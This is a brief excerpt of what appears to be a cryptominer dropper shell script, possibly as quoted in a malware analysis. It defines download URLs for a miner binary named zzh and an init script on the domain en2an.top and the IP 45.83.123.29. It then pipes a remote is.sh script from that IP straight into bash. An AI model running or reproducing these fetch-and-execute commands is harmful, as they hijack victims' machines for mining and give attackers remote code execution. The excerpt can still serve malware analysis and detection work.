...
miner_url_backup="http://45.83.123.29/cleanfda/zzh"
miner_size="2654112"
sh_url="http://en2an.top/cleanfda/newinit.sh"
sh_url_backup="http://45.83.123.29/cleanfda/newinit.sh"
chattr_size="8000"
...
$bbdir -fsSL http://45.83.123.29/cleanfda/is.sh | bash
$bbdira -fsSL http://45.83.123.29/cleanfda/is.sh | bash
